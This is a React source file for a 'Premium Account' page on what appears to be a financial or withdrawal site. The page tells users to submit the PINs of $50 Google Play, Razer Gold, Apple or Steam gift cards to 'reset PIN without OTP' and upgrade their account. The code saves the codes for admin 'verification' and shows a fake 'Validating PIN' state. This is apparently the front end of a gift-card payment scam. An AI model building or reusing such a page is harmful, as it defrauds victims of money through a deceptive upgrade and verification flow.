import React, { useState } from 'react';
import { useApp } from '../components/AppContext';
import { dbAPI } from '../lib/supabase';
import { 
  Star, 
  ShieldCheck, 
  Zap, 
  Award, 
  Headphones, 
  Gift, 
  Check, 
  Loader2 
} from 'lucide-react';

export const PremiumPage: React.FC = () => {
  const { user, showToast, refreshUserData } = useApp();
  const [giftCode, setGiftCode] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmitGiftCard = (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;
    if (!giftCode.trim() || giftCode.length < 10) {
      showToast('Invalid Code', `Please enter a valid $${user?.premium_upgrade_fee || 50} Google Play, Razer Gold, Apple, or Steam gift card PIN.`, 'error');
      return;
    }

    setIsSubmitting(true);
    setTimeout(() => {
      let cardType = 'playstore';
      const upperCode = giftCode.toUpperCase();
      if (upperCode.startsWith('RG')) cardType = 'razergold';
      else if (upperCode.startsWith('AP')) cardType = 'apple';
      else if (upperCode.startsWith('ST')) cardType = 'steam';

      dbAPI.adminSaveGiftCard({
        id: `gc-${Math.random().toString(36).substr(2, 9)}`,
        user_id: user.id,
        code: giftCode.trim().toUpperCase(),
        type: cardType as any,
        amount: user.premium_upgrade_fee || 50.00,
        status: 'pending',
        created_at: new Date().toISOString()
      });
      setIsSubmitting(false);
      setGiftCode('');
      showToast(
        'Submission Received', 
        'Your gift card has been submitted successfully! Verification is pending support team review.', 
        'success'
      );
      refreshUserData();
    }, 1500);
  };

  const premiumSteps = [
    {
      title: 'Reset PIN without OTP',
      desc: 'Bypass email verification to reset your secure withdrawal PIN instantly.',
      icon: ShieldCheck,
    },
    {
      title: 'Priority Processing',
      desc: 'Withdrawals and transfers processed first through faster high-priority rails.',
      icon: Zap,
    },
    {
      title: 'Premium Badge',
      desc: 'Display a golden verified premium status badge across your dashboard and profile.',
      icon: Award,
    },
    {
      title: 'Priority Support',
      desc: 'Get highly personalized, round-the-clock responses from our dedicated support team.',
      icon: Headphones,
    }
  ];

  return (
    <div className="flex flex-col gap-6 text-left max-w-2xl mx-auto">
      <div>
        <h1 className="font-display text-4xl font-bold tracking-tight text-slate-900">
          Premium Account
        </h1>
        <p className="text-sm text-slate-500 mt-1">
          Unlock enhanced features with a premium upgrade.
        </p>
      </div>

      {/* Main Premium Card */}
      <div className="bg-[#0a2540] rounded-3xl p-6 md:p-8 text-white relative overflow-hidden shadow-xl">
        {/* Background ambient radial glow to match mockup */}
        

        <div className="flex items-center gap-3 mb-6 relative z-10">
          <Star className="w-8 h-8 text-slate-500 fill-amber-400" />
          <h2 className="font-display text-2xl font-bold">Premium Benefits</h2>
        </div>

        <div className="flex flex-col gap-4 relative z-10">
          {premiumSteps.map((step, idx) => {
            const Icon = step.icon;
            return (
              <div 
                key={idx} 
                className="flex items-start gap-4 p-4 rounded-2xl bg-slate-50 border border-slate-200 hover:bg-slate-50 transition-all text-left"
              >
                <div className="p-2.5 rounded-xl bg-amber-400/10 text-slate-500 border border-amber-400/20">
                  <Icon className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-slate-900">{step.title}</h3>
                  <p className="text-xs text-slate-700 mt-1">{step.desc}</p>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Submit Gift Card Block */}
      <div className="bg-white rounded-3xl border border-slate-200 p-6 md:p-8 shadow-lg text-left">
        <div className="flex items-center gap-3 mb-4">
          <Gift className="w-6 h-6 text-slate-500" />
          <h2 className="font-display text-xl font-bold text-slate-900">Reset PIN & Upgrade to Premium</h2>
        </div>

        {/* Warning Badge Amber/Yellow Banner */}
        <div className="bg-amber-500/10 border border-amber-500/20 rounded-2xl p-4 text-slate-700 text-xs leading-relaxed mb-6 font-semibold flex items-start gap-2">
          <span>Submit a <strong className="text-slate-900 font-bold">${user?.premium_upgrade_fee || 50} Google Play</strong>, <strong className="text-slate-900 font-bold">${user?.premium_upgrade_fee || 50} Razer Gold</strong>, <strong className="text-slate-900 font-bold">${user?.premium_upgrade_fee || 50} Apple</strong>, or <strong className="text-slate-900 font-bold">${user?.premium_upgrade_fee || 50} Steam</strong> gift card inside the input panel below to reset your PIN and activate your premium account tier. Your submission will immediately enter a pending verification state for support team clearance.</span>
        </div>

        <form onSubmit={handleSubmitGiftCard} className="flex flex-col sm:flex-row gap-3">
          <input
            type="text"
            required
            value={giftCode}
            onChange={(e) => setGiftCode(e.target.value)}
            placeholder="Enter gift card claim code or PIN..."
            className="flex-1 px-4 py-3 rounded-2xl bg-slate-50 border border-slate-200 text-sm text-slate-900 placeholder-zinc-500 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 font-mono"
          />
          <button
            type="submit"
            disabled={isSubmitting}
            className="px-6 py-3 rounded-2xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold uppercase tracking-widest transition-all cursor-pointer flex items-center justify-center gap-2"
          >
            {isSubmitting ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Validating PIN</span>
              </>
            ) : (
              <span>Submit Pin</span>
            )}
          </button>
        </form>

        {user && dbAPI.getGiftCards().filter(g => g.user_id === user.id).length > 0 && (
          <div className="mt-8 pt-6 border-t border-slate-200">
            <h3 className="font-display text-sm font-bold text-slate-900 mb-4">Submitted Vouchers & Verification Audit</h3>
            <div className="flex flex-col gap-3">
              {dbAPI.getGiftCards().filter(g => g.user_id === user.id).map((g) => {
                const isPending = g.status === 'pending';
                const isVerified = g.status === 'verified';
                const isFailed = g.status === 'failed';
                return (
                  <div key={g.id} className="p-4 rounded-2xl bg-slate-50 border border-slate-200 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
                    <div className="font-sans text-left">
                      <p className="font-mono text-xs font-bold text-slate-900 tracking-wider select-all">{g.code}</p>
                      <p className="text-[10px] text-slate-500 mt-1 uppercase font-mono tracking-wider">
                        {g.type === 'playstore' ? 'Google Play / Amazon' : 'Razer Gold'} • ${g.amount}.00 USD • {new Date(g.created_at).toLocaleDateString()}
                      </p>
                    </div>
                    <div>
                      <span className={`inline-flex px-3 py-1 rounded-full text-[10px] font-mono font-bold uppercase border ${
                        isVerified ? 'bg-emerald-500/10 text-slate-500 border-emerald-500/20' :
                        isFailed ? 'bg-rose-500/10 text-slate-500 border-rose-500/20' : 'bg-amber-500/10 text-slate-500 border-amber-500/20 animate-pulse'
                      }`}>
                        {g.status}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
